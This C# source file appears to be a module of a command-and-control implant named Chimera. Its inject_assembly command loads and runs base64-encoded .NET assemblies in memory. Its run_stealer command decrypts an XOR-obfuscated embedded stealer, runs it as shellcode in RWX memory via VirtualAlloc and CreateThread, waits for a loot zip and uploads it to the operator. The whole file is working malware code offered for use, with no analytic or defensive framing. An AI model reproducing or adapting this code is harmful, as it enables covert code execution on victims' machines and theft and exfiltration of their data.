using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;

namespace Chimera.Commands
{
    // inject_assembly <base64_assembly> — load a .NET assembly from base64 and call its Run() method
    // run_stealer                        — decrypt embedded stealer_enc resource (XOR 0x41),
    //                                      write to staging dir, allocate RWX, run in thread,
    //                                      wait for loot zip, upload it
    public static class InjectAssembly
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpAddress, UIntPtr dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes, UIntPtr dwStackSize,
            IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        private const uint MEM_COMMIT  = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;

        private static readonly string LootPath  = Path.Combine(Staging.Dir, "stealer_loot.zip");
        private static readonly string StealerBin = Path.Combine(Staging.Dir, "stealer.bin");
        private const int PollSec = 120;

        public static string Execute(string parameters, string taskID, string callbackUUID)
        {
            if (string.IsNullOrEmpty(parameters) || parameters.Trim() == "run_stealer")
                return RunStealer(taskID, callbackUUID);

            return InjectDotnet(parameters);
        }

        // ── inject_assembly ───────────────────────────────────────────────────────
        private static string InjectDotnet(string base64Asm)
        {
            try
            {
                byte[] asmBytes = Convert.FromBase64String(base64Asm.Trim());
                Assembly asm    = Assembly.Load(asmBytes);

                MethodInfo entry = null;
                foreach (Type t in asm.GetTypes())
                {
                    entry = t.GetMethod("Run",
                        BindingFlags.Public | BindingFlags.Static, null, Type.EmptyTypes, null);
                    if (entry != null) break;
                    entry = t.GetMethod("Main",
                        BindingFlags.Public | BindingFlags.Static, null, Type.EmptyTypes, null);
                    if (entry != null) break;
                    entry = t.GetMethod("Main",
                        BindingFlags.Public | BindingFlags.Static, null,
                        new[] { typeof(string[]) }, null);
                    if (entry != null) break;
                }

                if (entry == null)
                    return "[error] No Run() or Main() found in assembly.";

                object[] args = entry.GetParameters().Length > 0
                    ? new object[] { new string[0] }
                    : null;

                var sw  = new System.IO.StringWriter();
                var old = Console.Out;
                Console.SetOut(sw);
                try   { entry.Invoke(null, args); }
                finally { Console.SetOut(old); }

                string captured = sw.ToString().Trim();
                return captured.Length > 0
                    ? captured
                    : "[+] Assembly executed (no stdout output).";
            }
            catch (Exception ex)
            {
                return "[error] inject_assembly: " + ex.Message;
            }
        }

        // ── run_stealer ───────────────────────────────────────────────────────────
        private static string RunStealer(string taskID, string callbackUUID)
        {
            try
            {
                Staging.EnsureDir();

                // 1. Load embedded resource stealer_enc
                var thisAsm = Assembly.GetExecutingAssembly();
                var stream  = thisAsm.GetManifestResourceStream("stealer_enc");
                if (stream == null)
                    return "[error] Resource 'stealer_enc' not found in assembly.";

                byte[] enc = new byte[stream.Length];
                stream.Read(enc, 0, enc.Length);
                stream.Close();

                // 2. XOR decrypt (key 0x41)
                byte[] shellcode = new byte[enc.Length];
                for (int i = 0; i < enc.Length; i++)
                    shellcode[i] = (byte)(enc[i] ^ 0x41);

                // 3. Write decrypted shellcode to staging dir for manual extraction
                File.WriteAllBytes(StealerBin, shellcode);

                // 4. Allocate RWX memory and copy shellcode in
                IntPtr mem = VirtualAlloc(
                    IntPtr.Zero,
                    (UIntPtr)shellcode.Length,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE);

                if (mem == IntPtr.Zero)
                    return "[error] VirtualAlloc failed: " + Marshal.GetLastWin32Error();

                Marshal.Copy(shellcode, 0, mem, shellcode.Length);

                // 5. Create thread
                uint tid;
                IntPtr hThread = CreateThread(
                    IntPtr.Zero, UIntPtr.Zero, mem, IntPtr.Zero, 0, out tid);

                if (hThread == IntPtr.Zero)
                    return "[error] CreateThread failed: " + Marshal.GetLastWin32Error();

                // 6. Poll up to PollSec seconds for loot zip
                bool found = false;
                for (int i = 0; i < PollSec; i++)
                {
                    Thread.Sleep(1000);
                    if (File.Exists(LootPath)) { found = true; break; }
                }

                if (!found)
                    return "[error] Stealer ran but loot zip not found at " + LootPath
                           + " within " + PollSec + " seconds.";

                // 7. Upload loot
                string uploadResult = Upload.Execute(
                    LootPath + " stealer_loot.zip", taskID, callbackUUID);

                // 8. Clean up loot (keep stealer.bin for manual use)
                try { File.Delete(LootPath); } catch { }

                return "[+] Stealer completed.\n" +
                       "    Shellcode: " + StealerBin + "\n" +
                       "    Loot uploaded: " + uploadResult;
            }
            catch (Exception ex)
            {
                return "[error] run_stealer: " + ex.Message;
            }
        }
    }
}
